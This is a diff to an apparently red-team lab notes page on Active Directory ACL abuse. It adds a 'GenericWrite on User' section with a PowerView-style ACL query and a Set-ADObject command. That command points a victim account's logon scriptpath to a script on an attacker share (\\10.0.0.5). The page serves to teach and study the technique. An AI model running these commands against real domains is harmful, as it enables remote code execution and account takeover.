@@ -138,7 +138,19 @@ Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -Ow
 
 ![](../../.gitbook/assets/screenshot-from-2018-11-08-16-54-59.png)
 
+### GenericWrite on User
 
+```csharp
+Get-ObjectAcl -ResolveGUIDs -SamAccountName delegate | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
+```
+
+![](../../.gitbook/assets/screenshot-from-2018-11-08-19-12-04.png)
+
+```csharp
+Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
+```
+
+![](../../.gitbook/assets/screenshot-from-2018-11-08-19-13-45.png)
 
 
 
@@ -147,4 +159,6 @@ Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -Ow
 ## References
 
 {% embed url="https://wald0.com/?p=112" %}
+
+{% embed url="https://docs.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2" %}
 
